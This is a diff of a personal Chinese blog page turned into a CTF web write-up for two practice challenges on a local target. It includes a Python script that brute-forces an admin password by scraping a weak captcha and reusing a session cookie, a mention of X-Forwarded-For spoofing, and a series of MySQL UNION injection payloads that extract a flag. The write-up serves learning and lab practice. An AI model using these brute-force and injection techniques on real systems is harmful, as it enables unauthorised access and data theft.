@@ -6,23 +6,28 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="theme-color" content="#f7f3e9" data-flatpaper-theme-color>
 
-<title>关于 | aClosure&#39;s奇妙的妙妙据点</title>
-<meta name="description" content="是啊，你怎么会点开这个？ 今天吃什么？ 难道今天不是疯狂星期一二三四五六日吗？我说今天明明是个适合吃天素罗大人的日子（） 话说ds（网页版）眼里的soyo怎么长这样😭 ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄▄ ▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄ ▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄ ▓▓▓▓▓▓▓...">
-<meta property="og:type" content="website">
-<meta property="og:title" content="关于 | aClosure&#39;s奇妙的妙妙据点">
-<meta property="og:url" content="http://example.com/about/">
+<title>tsctf-j-25 web-write-up | aClosure&#39;s奇妙的妙妙据点</title>
+<meta name="description" content="中秋节开始的一些尝试和学习……过几天应该会发杂谈，应该？">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tsctf-j-25 web-write-up | aClosure&#39;s奇妙的妙妙据点">
+<meta property="og:url" content="http://example.com/2026/09/26/tsctf-j-25/">
 <meta property="og:site_name" content="aClosure&#39;s奇妙的妙妙据点">
-<meta property="og:description" content="是啊，你怎么会点开这个？ 今天吃什么？ 难道今天不是疯狂星期一二三四五六日吗？我说今天明明是个适合吃天素罗大人的日子（） 话说ds（网页版）眼里的soyo怎么长这样😭 ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄▄ ▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄ ▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄ ▓▓▓▓▓▓▓...">
+<meta property="og:description" content="中秋节开始的一些尝试和学习……过几天应该会发杂谈，应该？">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2026-08-12T06:39:53.000Z">
-<meta property="article:modified_time" content="2026-09-10T12:59:17.895Z">
+<meta property="og:image" content="d:\03-Photo\Screenshots\%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE 2026-09-26 220202.png">
+<meta property="og:image" content="d:\03-Photo\Screenshots\%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE 2026-09-26 220450.png">
+<meta property="og:image" content="d:\03-Photo\Screenshots\%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE 2026-09-26 220607.png">
+<meta property="article:published_time" content="2026-09-26T13:20:33.000Z">
+<meta property="article:modified_time" content="2026-09-26T14:22:52.792Z">
 <meta property="article:author" content="aClosure">
+<meta property="article:tag" content="dev">
 <meta name="twitter:card" content="summary">
-<link rel="canonical" href="http://example.com/about/">
+<meta name="twitter:image" content="d:\03-Photo\Screenshots\%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE 2026-09-26 220202.png">
+<link rel="canonical" href="http://example.com/2026/09/26/tsctf-j-25/">
 
 <link rel="icon" href="/images/Ak_char_007_closre_3.png" type="image/png">
 
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"CollectionPage","headline":"关于 | aClosure's奇妙的妙妙据点","name":"关于 | aClosure's奇妙的妙妙据点","description":"是啊，你怎么会点开这个？ 今天吃什么？ 难道今天不是疯狂星期一二三四五六日吗？我说今天明明是个适合吃天素罗大人的日子（） 话说ds（网页版）眼里的soyo怎么长这样😭 ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄▄ ▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄ ▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄ ▓▓▓▓▓▓▓...","url":"http://example.com/about/","inLanguage":"zh-CN","isPartOf":{"@type":"WebSite","name":"aClosure's奇妙的妙妙据点","url":"http://example.com/"},"about":"关于"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"tsctf-j-25 web-write-up","name":"tsctf-j-25 web-write-up | aClosure's奇妙的妙妙据点","description":"中秋节开始的一些尝试和学习……过几天应该会发杂谈，应该？","url":"http://example.com/2026/09/26/tsctf-j-25/","inLanguage":"zh-CN","isPartOf":{"@type":"WebSite","name":"aClosure's奇妙的妙妙据点","url":"http://example.com/"},"mainEntityOfPage":"http://example.com/2026/09/26/tsctf-j-25/","datePublished":"2026-09-26T13:20:33.000Z","dateModified":"2026-09-26T14:22:52.792Z","author":{"@type":"Person","name":"aClosure"},"publisher":{"@type":"Organization","name":"aClosure's奇妙的妙妙据点"},"keywords":"dev"}</script>
 
 <script>
   (function () {
@@ -67,7 +72,7 @@
 </head>
 
 <body
-  class="is-list tag-style-tape bg-style-default"
+  class="is-post tag-style-tape bg-style-default"
   data-default-accent="green"
   data-code-theme="simple"
   data-note-style="sticky"
@@ -129,7 +134,7 @@
       
     
       
-        <a class="site-nav-link active" href="/about/">
+        <a class="site-nav-link " href="/about/">
           
 <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-user"></use></svg>
 
@@ -280,7 +285,7 @@
         
       
         
-          <a class="active" href="/about/">
+          <a class="" href="/about/">
             
 <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-user"></use></svg>
 
@@ -426,64 +431,28 @@
   
 
   
-    <section class="side-card categories-card">
-      <h2>
-<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-folder flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-folder"></use></svg>
-分类</h2>
-      
-        <a href="/categories/life/">
-          <span class="dot dot-0"></span>
-          <strong>life</strong>
-          <em>1</em>
-        </a>
-      
-        <a href="/categories/logs/">
-          <span class="dot dot-1"></span>
-          <strong>logs</strong>
-          <em>2</em>
-        </a>
-      
-        <a href="/categories/logs/game/">
-          <span class="dot dot-2"></span>
-          <strong>game</strong>
-          <em>1</em>
-        </a>
-      
-        <a href="/categories/ctfer/">
-          <span class="dot dot-3"></span>
-          <strong>ctfer</strong>
-          <em>3</em>
-        </a>
-      
-    </section>
+    <div class="post-sticky-stack">
+      <section class="side-card toc-card">
+        <header class="toc-card__head">
+          <h2>
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-table-of-contents flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-table-of-contents"></use></svg>
+文章目录</h2>
+          <button type="button" class="toc-toggle-all" data-action="toggle-toc" aria-pressed="false" aria-label="展开全部目录" title="展开全部目录">
+            
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-down flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-chevron-down"></use></svg>
 
-    <section class="side-card tag-card">
-      <header class="tag-card__head">
-        <h2>
-<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-flame flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-flame"></use></svg>
-热门标签</h2>
-        <a class="tag-card__more" href="/tags/">
-          <span>查看全部</span>
+          </button>
+        </header>
+        <div class="toc-content">
           
-<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-right flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-arrow-right"></use></svg>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#T1-EZ-login"><span class="toc-text">T1-EZ_login</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9A%E8%BF%9B%E5%85%A5%EF%BC%9A"><span class="toc-text">刚进入：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%95%E9%AA%8C%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%EF%BC%9A"><span class="toc-text">试验登录逻辑：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#T2-ez-sql"><span class="toc-text">T2-ez_sql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%90-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E6%8A%A5%E8%BF%99%E4%B8%AA%E9%94%99%EF%BC%9F"><span class="toc-text">🧐 为什么会报这个错？</span></a></li></ol></li></ol>
+          
+        </div>
+      </section>
+      
 
-        </a>
-      </header>
-      <div class="tag-cloud">
-        
-        
-          <a class="tag-chip tag-chip-0" href="/tags/dev/">dev</a>
-        
-          <a class="tag-chip tag-chip-1" href="/tags/omakase/">omakase</a>
-        
-          <a class="tag-chip tag-chip-2" href="/tags/OutofRes/">OutofRes</a>
-        
-          <a class="tag-chip tag-chip-3" href="/tags/gal/">gal</a>
-        
-          <a class="tag-chip tag-chip-4" href="/tags/smTalk/">smTalk</a>
-        
-      </div>
-    </section>
+
+    </div>
   
 
   
@@ -497,49 +466,213 @@
 <span class="tape tape--top-right" aria-hidden="true"></span>
 <article class="article-paper">
   
-
-
   <header class="article-header">
-    <span class="label-pill">页面</span>
-    <h1>关于</h1>
+    
+      <a class="label-pill" href="/categories/ctfer/">
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-folder flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-folder"></use></svg>
+
+        ctfer
+      </a>
+    
+    <h1>tsctf-j-25 web-write-up</h1>
+    <div class="meta-line meta-line--article">
+      <span class="meta-date">
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-calendar flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-calendar"></use></svg>
+2026-09-26</span>
+      
+        <span class="meta-tags">
+          
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tag flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-tag"></use></svg>
+
+          <a class="meta-tag-link" href="/tags/dev/">#dev</a>
+        </span>
+      
+    </div>
   </header>
+
+  
+
+
   <div class="article-content">
-    <p>是啊，你怎么会点开这个？<br>
-今天吃什么？<br>
-难道今天不是疯狂星期一二三四五六日吗？我说今天明明是个适合吃天素罗大人的日子（）<br>
-话说ds（网页版）眼里的soyo怎么长这样😭<br>
-▄▄▄▄▄▄▄▄▄▄▄▄<br>
-▄▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄▄<br>
-▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄<br>
-▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄<br>
-▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓<br>
-▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓<br>
-▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓<br>
-▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓<br>
-▓▓▓▓▓▓▓▓▓▓▓                ▓▓▓▓▓▓▓▓▓▓<br>
-▓▓▓▓▓▓▓▓▓   ▄▄▄▄▄▄▄▄▄▄▄▄   ▓▓▓▓▓▓▓<br>
-▓▓▓▓▓▓▓▓   ██████████████   ▓▓▓▓▓▓<br>
-▓▓▓▓▓▓▓   ███          ███   ▓▓▓▓▓<br>
-▓▓▓▓▓▓  ██    ◉    ◉    ██  ▓▓▓▓▓<br>
-▓▓▓▓▓▓  ██              ██  ▓▓▓▓▓<br>
-▓▓▓▓▓▓   ██    ⌣⌣⌣    ██   ▓▓▓▓▓<br>
-▓▓▓▓▓▓▓   ██████████████   ▓▓▓▓▓<br>
-▓▓▓▓▓▓▓▓   ▀▀▀▀▀▀▀▀▀▀▀▀   ▓▓▓▓▓<br>
-▓▓▓▓▓▓▓▓▓▓▓                ▓▓▓▓▓▓▓▓▓<br>
-▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓<br>
-▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓<br>
-▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓<br>
-▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓<br>
-▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓<br>
-▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓<br>
-▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓<br>
-▓▓▓▓▓▓▓▓▓▓<br>
-▓▓▓▓▓<br>
-▓▓</p>
+    <p>在这个中秋假的第二天，经历了两天的出门<s>瞎逛</s>后，kur0sia决定继续他的ctf题目，并用docker在本地靶场做了第一道web题。他尚且不知道自己能不能在国庆后的招新赛中进入天璇merak，也不知道自己使用agent的实际操作到底能不能通过之后的wp，就这样在宿舍里头看着我们的题目……总之，clo是决定要先看看去年题，来准备一下招新了！</p>
+<h2 id="T1-EZ-login">T1-EZ_login</h2>
+<p>这题说实话可一点都不easy…综合程度比moe难了不少：</p>
+<h3 id="刚进入：">刚进入：</h3>
+<p>刚进入显示一个登陆系统，有用户名，密码，验证码三栏。用户名就是admin，密码未知，验证码……看着挺好的。我们没有入手点，先看源码吧：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>管理员登录<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span>&gt;</span>验证码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;captcha-images&quot;</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/captcha_images/6.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;captcha-digit&quot;</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/captcha_images/2.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;captcha-digit&quot;</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/captcha_images/1.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;captcha-digit&quot;</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/captcha_images/3.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;captcha-digit&quot;</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;captcha&quot;</span> <span class="attr">name</span>=<span class="string">&quot;captcha&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注意到body是这么写的，但其中验证码非常神奇，是由对应的数字对应上具体图片形成“验证码”，我们可以直接使用正则表达式把每次的验证码抓出来，事实上是形同虚设了。</p>
+<h3 id="试验登录逻辑：">试验登录逻辑：</h3>
+<p>我们不知道密码，但是这么一个可怜的本地网站可以直接爆破干穿。这里我们先试验一下登录的逻辑：</p>
+<ul>
+<li>在验证码正确但是密码错误的情况下，会返回账号或密码错误；</li>
+<li>在验证码错误，密码不知道（废话，知道我一会还爆破个蛋）的情况下，会返回验证码错误。</li>
+<li>试着抓一个包，然后发现，对于每次不同的验证码，在反复使用任意一次cookie的情况下，可以一直登录（后端没有机制杀掉老旧cookie）。感谢tsctf官方的wp（笑</li>
+</ul>
+<p>这样一来我们就可以放心的写一个爆破的简单脚本了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re, requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://127.0.0.1:1000/login&quot;</span></span><br><span class="line">WORDLIST = <span class="string">&quot;/home/clolinux/rockyou.txt&quot;</span></span><br><span class="line"></span><br><span class="line">page = requests.get(URL, timeout=<span class="number">10</span>)</span><br><span class="line">cookie = page.cookies.get(<span class="string">&quot;session&quot;</span>)</span><br><span class="line">captcha = <span class="string">&quot;&quot;</span>.join(re.findall(<span class="string">r&quot;/static/captcha_images/(\d)\.png&quot;</span>, page.text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(WORDLIST, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;latin-1&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(f, <span class="number">1</span>):</span><br><span class="line">		pw = line.rstrip(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">		rr = requests.post(URL,</span><br><span class="line">                           data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                                 <span class="string">&quot;password&quot;</span>: pw,          <span class="comment"># 修复③：真的把 pw 发出去</span></span><br><span class="line">                                 <span class="string">&quot;captcha&quot;</span>: captcha&#125;,     <span class="comment"># 修复⑤：带上 captcha</span></span><br><span class="line">                           cookies=&#123;<span class="string">&quot;session&quot;</span>: cookie&#125;, timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;验证码错误&quot;</span> <span class="keyword">in</span> rr.text:</span><br><span class="line">            <span class="keyword">raise</span> SystemExit(<span class="string">f&quot;[-] 第 <span class="subst">&#123;i&#125;</span> 次请求验证码失效&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;用户名或密码错误&quot;</span> <span class="keyword">in</span> rr.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">f&quot;[+] 成功！password = <span class="subst">&#123;pw&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>我们可以得到密码为simple，登录，发现：“<strong>你似乎不是本地管理员</strong>”。所以我们在请求里加入XFF即可，token里头就是一个没加密的flag。</p>
+<p>P.S：一些dsh的补充：</p>
+<blockquote>
+<p>验证码的安全价值不在&quot;图片长得难不难认&quot;，而在于<strong>答案是否只为服务端所知、且只用一次</strong>。这道题的图片连干扰线都懒得加，答案还是服务端亲手写成文字递过来的——它看起来像一道门，实际是一张贴在门上的钥匙。</p>
+<p><strong>无状态 Cookie 在原理上无法表达&quot;一次性&quot;</strong>。Cookie 能<strong>携带</strong>数据，不能<strong>消费</strong>数据——没有&quot;这个值已用过&quot;的概念。要一次性就必须有服务端状态（Redis 存 <code>sid→answer</code>，校验后 <code>DEL</code> + 过期）。</p>
+<p><strong>信息不只在页面里，也在响应头里</strong>。登录后页面&quot;啥也没有&quot;，但 <code>Set-Cookie</code> 里躺着 token。这是黑盒题的基本功：抓包看完整响应，不只盯渲染结果。</p>
+</blockquote>
+<h2 id="T2-ez-sql">T2-ez_sql</h2>
+<p>打开后发现是一个叫Vulnerability Database的玩意，反正根据题目来说就是一个sql注入。首先规规矩矩尝试1~8，发现是随便写了些web的具体漏洞。但是和flag没什么关系。但既然是sql，我们自然是先用原来那几步试试的好：</p>
+<p><code>1' #</code>   这个正常，说明可以带引号（事实上是下一个order by的时候，数字型没用</p>
+<p><code>1' Order by 3 ; #</code>  到4报错，说明就只有显示的那三行</p>
+<p><code>-1' UNION SELECT 111,schema_name,database()  from information_schema.schemata; #</code></p>
+<img src="D:\03-Photo\Screenshots\屏幕截图 2026-09-26 220202.png" style="zoom:43%;" />
+<p><code>-1' UNION SELECT 111,database(),table_name  from information_schema.tables where table_schema = database(); #</code></p>
+<img src="D:\03-Photo\Screenshots\屏幕截图 2026-09-26 220450.png" style="zoom:43%;" />
+<p><code>-1' UNION SELECT 111,database(),column_name  from information_schema.columns where table_schema = database() and table_name = &quot;flag&quot;; #</code></p>
+<img src="D:\03-Photo\Screenshots\屏幕截图 2026-09-26 220607.png" style="zoom:43%;" />
+<p>一直到这里都没什么问题，我们满怀期待地尝试<code>-1' union select 111, 222, flag from flag; #</code> 试图就此搞到flag。但是……</p>
+<p>但是到这里，发现union突然被ban了，怎么你之前就不ban😡</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*No results found for ID: -1&#x27; union select 111, 222, flag from flag; #*</span><br><span class="line">Error: Illegal mix of collations for operation &#x27;UNION&#x27;</span><br></pre></td></tr></table></figure>
+<p>询问ds网页版老师，发现：</p>
+<blockquote>
+<p>你遇到的 <code>Illegal mix of collations for operation 'UNION'</code> 错误，核心原因是<strong>SQL语句中参与 <code>UNION</code> 查询的各列，其字符集（Collation）不一致，MySQL 无法决定用哪一个规则来合并结果</strong>。</p>
+<h3 id="🧐-为什么会报这个错？">🧐 为什么会报这个错？</h3>
+<p>在 SQL 注入中，你构造的 <code>-1' union select 111, 222, flag from flag; #</code> 会和原查询合并。原查询的列（如 <code>first_name</code>）有自己的字符集，而你注入的 <code>flag</code> 列或字符串常量 <code>111</code>、<code>222</code> 也可能有各自的字符集。当这些字符集不匹配时，<code>UNION</code> 操作就无法进行，从而抛出此错误。</p>
+<p>这在 <strong>DVWA</strong> 等靶场中很常见，因为靶场数据库的 <code>users</code> 表和 <code>information_schema</code> 等系统表的字符集可能不同（例如一个是 <code>utf8_general_ci</code>，另一个是 <code>utf8_unicode_ci</code>）</p>
+</blockquote>
+<p>改成<code>-1' union select 111, 222, CONVERT(flag using utf8) from flag; #</code> convert一下编码即可。</p>
 
   </div>
+
+  <footer class="article-reactions">
+    <div class="reaction-group">
+      <button type="button" class="reaction reaction--comment" aria-label="跳转到评论区" data-action="scroll-to-comments">
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-message-circle flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-message-circle"></use></svg>
+
+      </button>
+      <span class="reaction-label">评论</span>
+      
+    </div>
+    <div class="reaction-group reaction-group--right">
+      
+<div class="reaction-pop reaction-pop--right">
+  <button type="button" class="reaction reaction--reward" data-action="toggle-pop" aria-expanded="false" aria-label="也许会发生一些好事！">
+    
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-imagesfaviconpng flatpaper-icon" aria-hidden="true"><circle cx="12" cy="12" r="3"/></svg>
+
+  </button>
+  <span class="reaction-label">也许会发生一些好事！</span>
+  <div class="reaction-bubble" role="dialog" aria-label="这里只有伟大的closuresama哒！" hidden>
+    <div class="reaction-bubble-title">这里只有伟大的closuresama哒！</div>
+    <img class="reaction-bubble-img no-zoom" src="/images/const_img/kur0sia.jpg" alt="这里只有伟大的closuresama哒！" loading="lazy">
+  </div>
+</div>
+
+      <button type="button" class="reaction reaction--share" aria-label="分享" data-action="share">
+        
